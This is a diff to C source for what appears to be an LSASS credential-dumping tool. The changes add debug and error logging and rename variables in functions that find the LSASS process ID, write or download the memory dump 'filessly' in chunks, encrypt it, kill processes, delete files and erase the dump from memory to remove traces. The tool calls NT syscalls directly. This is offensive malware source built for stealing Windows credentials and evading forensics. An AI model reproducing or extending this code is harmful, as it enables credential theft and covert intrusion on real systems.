@@ -60,6 +60,7 @@ BOOL write_file(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtCreateFile", status);
+        PRINT_ERR("Could not write the dump %s", fileName);
         return FALSE;
     }
     // write the dump
@@ -78,9 +79,10 @@ BOOL write_file(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtWriteFile", status);
+        PRINT_ERR("Could not write the dump %s", fileName);
         return FALSE;
     }
-
+    DPRINT("The dump has been written to %s", fileName);
     return TRUE;
 }
 
@@ -139,9 +141,11 @@ BOOL create_file(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtCreateFile", status);
+        DPRINT_ERR("Could not create file at %s", fileName);
         return FALSE;
     }
     NtClose(hFile); hFile = NULL;
+    DPRINT("File created: %s", fileName);
     return TRUE;
 }
 
@@ -170,6 +174,7 @@ BOOL download_file(
     if (!packedData)
     {
         malloc_failed();
+        DPRINT_ERR("Could download the dump");
         return FALSE;
     }
 
@@ -205,6 +210,7 @@ BOOL download_file(
     if (!packedChunk)
     {
         malloc_failed();
+        DPRINT_ERR("Could download the dump");
         return FALSE;
     }
     // the fileId is the same for all chunks
@@ -244,6 +250,7 @@ BOOL download_file(
         packedClose,
         4
     );
+    DPRINT("The dump was downloaded filessly");
     return TRUE;
 }
 #endif
@@ -265,7 +272,10 @@ BOOL kill_process(
         FALSE
     );
     if (!hProcess)
+    {
+        DPRINT_ERR("Failed to kill process with PID: %ld", pid);
         return FALSE;
+    }
 
     NTSTATUS status = NtTerminateProcess(
         hProcess,
@@ -274,8 +284,10 @@ BOOL kill_process(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtTerminateProcess", status);
+        DPRINT_ERR("Failed to kill process with PID: %ld", pid);
         return FALSE;
     }
+    DPRINT("Killed process with PID: %ld", pid);
     return TRUE;
 }
 
@@ -291,6 +303,7 @@ BOOL wait_for_process(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtWaitForSingleObject", status);
+        DPRINT_ERR("Could not wait for process");
         return FALSE;
     }
     return TRUE;
@@ -327,8 +340,10 @@ BOOL delete_file(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtDeleteFile", status);
+        DPRINT_ERR("Could not delete file: %s", filepath);
         return FALSE;
     }
+    DPRINT("Deleted file: %s", filepath);
     return TRUE;
 }
 
@@ -381,6 +396,7 @@ BOOL file_exists(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtCreateFile", status);
+        DPRINT_ERR("Could check if the file %s exists", filepath);
         return FALSE;
     }
     NtClose(hFile); hFile = NULL;
@@ -400,6 +416,7 @@ PVOID get_process_image(
         if (!buffer)
         {
             malloc_failed();
+            DPRINT_ERR("Could not get the image of process");
             return NULL;
         }
         status = NtQueryInformationProcess(
@@ -416,6 +433,7 @@ PVOID get_process_image(
     } while (status == STATUS_INFO_LENGTH_MISMATCH);
 
     syscall_failed("NtQueryInformationProcess", status);
+    DPRINT_ERR("Could not get the image of process");
     return NULL;
 }
 
@@ -473,6 +491,14 @@ DWORD get_lsass_pid(void)
         return 0;
     lsass_pid = get_pid(hProcess);
     NtClose(hProcess); hProcess = NULL;
+    if (!lsass_pid)
+    {
+        DPRINT_ERR("Could not get the PID of LSASS");
+    }
+    else
+    {
+        DPRINT("Found the PID of LSASS: %ld", lsass_pid);
+    }
     return lsass_pid;
 }
 
@@ -541,15 +567,15 @@ void free_linked_list(
 }
 
 PVOID allocate_memory(
-    PSIZE_T RegionSize
+    PSIZE_T region_size
 )
 {
-    PVOID BaseAddress = NULL;
+    PVOID base_address = NULL;
     NTSTATUS status = NtAllocateVirtualMemory(
         NtCurrentProcess(),
-        &BaseAddress,
+        &base_address,
         0,
-        RegionSize,
+        region_size,
         MEM_COMMIT,
         PAGE_READWRITE
     );
@@ -560,7 +586,12 @@ PVOID allocate_memory(
         )
         return NULL;
     }
-    return BaseAddress;
+    DPRINT(
+        "Allocated 0x%llx bytes at 0x%p to write the dump",
+        (ULONG64)*region_size,
+        base_address
+    );
+    return base_address;
 }
 
 void encrypt_dump(
@@ -578,17 +609,22 @@ void erase_dump_from_memory(
     // delete all trace of the dump from memory
     memset(dc->BaseAddress, 0, dc->rva);
     // free the memory area where the dump was
-    PVOID BaseAddress = dc->BaseAddress;
-    SIZE_T RegionSize = dc->DumpMaxSize;
+    PVOID base_address = dc->BaseAddress;
+    SIZE_T region_size = dc->DumpMaxSize;
     NTSTATUS status = NtFreeVirtualMemory(
         NtCurrentProcess(),
-        &BaseAddress,
-        &RegionSize,
+        &base_address,
+        &region_size,
         MEM_RELEASE
     );
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtFreeVirtualMemory", status);
+        DPRINT_ERR("Could not erased the dump from memory");
+    }
+    else
+    {
+        DPRINT("Erased the dump from memory");
     }
 }
 
